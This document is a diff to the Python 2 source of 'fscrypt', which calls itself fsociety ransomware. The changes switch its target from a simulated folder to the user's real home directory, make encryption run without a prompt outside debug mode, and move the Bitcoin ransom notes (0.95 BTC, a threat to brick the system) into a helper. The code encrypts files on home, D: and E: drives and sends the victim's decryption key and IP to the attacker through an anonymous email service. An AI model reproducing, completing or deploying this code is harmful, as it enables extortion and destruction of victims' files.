@@ -1,3 +1,5 @@
+#!/usr/bin/python2
+
 from Crypto.Cipher import AES
 from Crypto import Random
 from hashlib import md5
@@ -78,34 +80,46 @@ class Fscrypt(object):
         self.os_name     = None
         self.os_release  = None
         self.ipv4_addr   = ''          # public ipv4 addr
-
+        
         self.id_length   = 69          # size of identify code
         self.key_length  = 69          # size of ke
         self.session_id  = ''          # identify code
         self.session_key = ''          # encryption key
-
-        self.file_count  = 0
+        
+        # Payment
         self.btc_addr    = 'address_of_your_btc_wallet'
+        self.btc_amount  = 0.95
+        self.due_days    = 7
+        self.file_count  = 0
         
         # After infecting, we will send an email to the attacker
         # which reports information about the victim.
         self.recipient  = "some@email.address"
         self.subject    = ''
         self.msg_cont   = ''
+        
+        # Notice filename
+        self.html_notice = 'NOTICE.html'
+        self.txt_note    = 'note.txt'
 
 
-    def set_env(self):
+    def probe_OS(self, debug):
         # Detect OS and release.
         self.os_name = platform.system()
         self.os_release = platform.release()
         
         # Set encryption path.
         if self.os_name == 'Linux':
-            #self.path_enc = os.getenv('HOME')
-            self.path_enc = '/home/aesophor/sim_home'
+            self.path_enc = os.getenv('HOME')
+            
+            if debug is True:
+                self.path_enc += '/fake_home'
         
         elif self.os_name == 'Windows':
             self.path_enc = 'C:/Users/' + os.getenv('username')
+            
+            if debug is True:
+                self.path_enc += '/fake_home'
 
 
     def get_ipv4(self):
@@ -209,14 +223,13 @@ class Fscrypt(object):
                 # Print path to all filenames.
                 for filename in filenames:
                     # This file cannot be decrypted, so do not perform decryption on this one.
-                    if filename == "NOTICE.html" or filename == "notice.txt":
+                    if filename == "NOTICE.html" or filename == "note.txt":
                         continue        
                     # Call the decrypt function.
                     with open(os.path.join(self.cwd, dirname,filename), 'rb') as in_file, open(os.path.join(self.cwd, dirname,filename)[:-6], 'wb') as out_file:
                         self.decrypt(in_file, out_file, self.session_key)
                     # Delete the encrypted file after encrypting it.
                     os.remove(os.path.join(self.cwd, dirname, filename))
-
 
     # We will use mechanize to simulate a web browser,
     # and send an anonymous mail with the service provided by anonymouse.org.
@@ -225,11 +238,15 @@ class Fscrypt(object):
         
         # Setting and importing variables
         self.subject = 'fscrypt - New Infection from ' + self.ipv4_addr
-        self.msg_cont = """Identification Code: ' + %s + '\n
-                           Decryption Key: ' + %s + '\n
-                           OS Info: ' + %s + %s + '\n
-                           First Connect: ' + %s + '\n\n\n
-                           """ % (self.session_id, self.session_key, self.os_name, self.os_release, self.ipv4_addr)
+        self.msg_cont = """Identification Code: {0}\n
+                           Decryption Key: {1}\n
+                           OS Info: {2} {3}\n
+                           First Connect: {4}\n\n\n
+                           """.format(self.session_id,
+                                      self.session_key,
+                                      self.os_name,
+                                      self.os_release,
+                                      self.ipv4_addr)
         
         url     = "http://anonymouse.org/anonemail.html"
         to      = self.recipient
@@ -258,113 +275,146 @@ class Fscrypt(object):
         result = br.submit()
 
 
-    def start(self):
-        # Detect and set system info.
-        print "[*] Detecting OS"
-        self.set_env()
+    def write_notice(self, type, filename):
+        filepath = self.path_enc + '/Desktop/'
         
-        # Retrieve victim ip addr
-        print "[*] Fetching ipv4 address"
+        if type == 'html':
+            filepath += filename
+            
+            with open(filepath, 'w+') as html:
+                notice = """<HEAD>\n<TITLE>#OPfuxsocy</TITLE>\n</HEAD>\n
+                            <BODY BGCOLOR="BLACK">\n<BODY TEXT="WHITE">\n
+                            <CENTER>\n
+                            <H1><br>#OPfuxsocy<br></H1>\n
+                            <H2>Your files are now encrypted.</H2>\n
+                            <H4>To get the key to decrypt files you have to pay {0} BTC.</H4>\n
+                            <H5>If the payment is not made in {1} days, we will brick your entire system.</H5>\n
+                            <H3>...</H3>\n
+                            <H4>Bitcoin address: {2}</H4>\n
+                            <H3>...</H3>\n
+                            <H5>Your System: {3} {4} | 
+                            First Connected: {5} | 
+                            Total encrypted {6} files. </H5>\n
+                            <H5>For more info, check {7} on your desktop.</H5>\n
+                            <H5>More instruction forthcoming - fsociety.</H5>\n
+                            <IMG SRC="https://i.imgur.com/9g2PgPA.jpg">\n
+                            </CENTER>""".format(self.btc_amount, 
+                                                self.due_days ,
+                                                self.btc_addr, 
+                                                self.os_name, 
+                                                self.os_release, 
+                                                self.ipv4_addr, 
+                                                self.file_count,
+                                                self.txt_note)
+                html.write(notice)
+                
+        elif type == 'txt':
+            filepath += filename
+            
+            with open(filepath, 'w+') as txt:
+                notice = """#OPfuxsocy\n
+                            Your files are now encrypted. To get the key to decrypt the files, you have to pay {0} BTC.\n
+                            If the payment is not made in {1} days, we will brick your entire system.\n\n\n
+                            -Instructions on making payment:\n
+                            #1 You should register a Bitcoin Wallet.\n\n
+                            #2 Purchase Bitcoins - Although it is not yet easy to buy bitcoins, it is getting simpler every day.\n
+                            (Coin.mx, LocalBitcoins.com, bitquick.co, ...)\n\n
+                            #3 Send {2} BTC to Bitcoin Address: {3}\n\n
+                            #4 Contact us via email: {4} , send us BOTH your <Identification Code> and <Transaction ID (TXID)>.\n
+                            (You can find in detailed info about transaction you made.)\n\n
+                            #5 Activation may takes up to 48 hours. The moment we verify your payment, 
+                            we will send you the decryption software and your unique key.\n\n
+                            Identification Code: {5}\n
+                            Bitcoin Address: {6}\n\n\n
+                            fsociety""".format(self.btc_amount,
+                                               self.due_days,
+                                               self.btc_amount,
+                                               self.btc_addr,
+                                               self.recipient,
+                                               self.session_id,
+                                               self.btc_addr)
+                txt.write(notice)
+        
+        else:
+            pass
+
+
+    def print_banner(self, debug):
+        if debug is True:
+            print 
+            print "[*] Session ID: " + self.session_id
+            print "[*] Session Key: " + self.session_key
+            print
+            print " fscrypt"
+            print " fsociety ransomware"
+            print " Version: Dev-1.0.2"
+            print " Host OS: " + self.os_name + self.os_release
+            print " First connect: " + self.ipv4_addr
+            print "================================================="
+            print " [*] Available Actions:"
+            print "     (1) Encrypt disk"
+            print "     (2) Decrypt disk"
+            print
+
+
+    def start(self, debug):
+        print "Executing fscrypt\n"
+        
+        # Probe user OS and retrieve user ipaddr
+        print "[*] Preparing fscrypt"
+        self.probe_OS(debug)
         self.ipv4_addr = self.get_ipv4()
        
         # Generate identify code and encryption key.
-        print "[*] Generating session credential"
+        print "[*] Generating session credential\n"
         self.session_id = self.idgen(self.id_length)
         for i in range(0,2):
             self.session_key += self.keygen(self.key_length)
         
-        print 
-        print "[*] Session ID: " + self.session_id
-        print "[*] Session Key: " + self.session_key
-        print
-        print " fscrypt"
-        print " fsociety ransomware"
-        print " Version: Dev-1.0.2"
-        print " Host OS: " + self.os_name + self.os_release
-        print " First connect: " + self.ipv4_addr
-        print "================================================="
-        print " [*] Available Actions:"
-        print "     (1) Encrypt disk"
-        print "     (2) Decrypt disk"
-        print
-        
+        self.print_banner(debug)
         
         while True:
             try:
-                self.choice = raw_input("[fscrypt] > ")
+                self.choice = raw_input("[fscrypt] > ") if debug is True else '1'
                 
                 if self.choice == '1':
-                    print "[*] fscrypt encryption initialized."
+                    print "[*] beginning crypto operations"
                     
                     # Encrypt all files under user(for Linux and Windows), D:\ and E:\ (for Windows)
                     self.encrypt_dirs( [self.path_enc, 'D:/', 'E:/'] )
                     
-                    # Write HTML notice to user desktop.
-                    with open(self.path_enc + '/Desktop/NOTICE.html', 'w+') as html:
-                        notice = """<HEAD>\n<TITLE>#OPfuxsocy</TITLE>\n</HEAD>\n
-                                    <BODY BGCOLOR="BLACK">\n<BODY TEXT="RED">\n
-                                    <CENTER>\n
-                                    <H1><br>#OPfuxsocy<br></H1>\n
-                                    <H2>Your files are now encrypted.</H2>\n
-                                    <H4>To get the key to decrypt files you have to pay 0.95 BTC.</H4>\n
-                                    <H5>If the payment is not made in 7 days, we will brick your entire system.</H5>\n
-                                    <H3>_</H3>\n
-                                    <H4>Bitcoin address: {0}</H4>\n
-                                    <H3>_</H3>\n
-                                    <H5>Your System: {1} {2} | 
-                                    First Connected: {3} | 
-                                    Total encrypted {4} files. </H5>\n
-                                    <H5>For more info, check notice.txt on your desktop.</H5>\n
-                                    <H5>More instruction forthcoming - fsociety.</H5>\n
-                                    <IMG SRC="https://i.imgur.com/9g2PgPA.jpg">\n
-                                    </CENTER>""".format(self.btc_addr, self.os_name, self.os_release, self.ipv4_addr, self.file_count)
-                        html.write(notice)
-                        
-                    # Write txt notice to user desktop
-                    with open(self.path_enc + '/Desktop/notice.txt', 'w+') as txt:
-                        notice = """#OPfuxsocy\n
-                                    Your files are now encrypted. To get the key to decrypt the files, you have to pay 0.95 BTC.\n
-                                    If the payment is not made in 7 days, we will brick your entire system.\n\n\n
-                                    -Instructions on making payment:\n
-                                    #1 You should register a Bitcoin Wallet.\n\n
-                                    #2 Purchase Bitcoins - Although it is not yet easy to buy bitcoins, it is getting simpler every day.\n
-                                    (Coin.mx, LocalBitcoins.com, bitquick.co, ...)\n\n
-                                    #3 Send 0.95 BTC to Bitcoin Address: {0}\n\n
-                                    #4 Contact us via email: {1} , send us BOTH your <Identification Code> and <Transaction ID (TXID)>.\n
-                                    (You can find in detailed info about transaction you made.)\n\n
-                                    #5 Activation may takes up to 48 hours. The moment we verify your payment, 
-                                    we will send you the decryption software and your unique key.\n\n
-                                    Identification Code: {2}\n
-                                    Bitcoin Address: {3}\n\n\n
-                                    fsociety""".format(self.btc_addr, self.recipient, self.session_id, self.btc_addr)
-                        txt.write(notice)
-                        
                     # Done. report to c&c.
                     self.send_report()
                     
-                    # Display notice to user.
-                    webbrowser.open(self.path_enc + '/Desktop/NOTICE.html')
-                    print "[*] fscrypt encryption finished. Total encrypted %i files." % self.file_count
+                    # Write html and txt notice to user desktop.
+                    # Then display html notice to user.
+                    self.write_notice('html', self.html_notice)
+                    self.write_notice('txt', self.txt_note)
+                    
+                    webbrowser.open(self.path_enc + '/Desktop/' + self.html_notice)
+                    print "[*] Done. Totally encrypted %i files." % self.file_count
+                    break
                     
                 elif self.choice == '2':
-                    print "[*] fscrypt decryption initialized."
+                    print "[*] beginning decryption operations"
                     
                     self.session_key = raw_input("[+] Please enter the key the files were encrypted with : ")
                     self.confirm = raw_input("[*] Is the key correct? (If the key is incorrect, all your files will be unrecoverable.) (y/n)")
-                    if self.confirm == 'n' or self.confirm == 'N':
-                        print "[-] Session aborted."
                     
-                    # Decrypt the files
-                    self.decrypt_dirs( [self.path_enc, 'D:/', 'E:/'] )
-                    print "[*] fscrypt decryption complete."
+                    if self.confirm == 'y' or self.confirm == 'Y':
+                        self.decrypt_dirs( [self.path_enc, 'D:/', 'E:/'] )
+                        print "[*] Done. Files Decrypted"
+                        break
+                    else:
+                        print "[-] Session aborted."
                     
                 else:
                     print "[-] Your selection does not exist."
                     
             except KeyboardInterrupt:
                 print "\n[-] Session ended as user requested."
-                sys.exit()
+                break
 
 
 fscrypt = Fscrypt()
-fscrypt.start()
+fscrypt.start(debug=True)
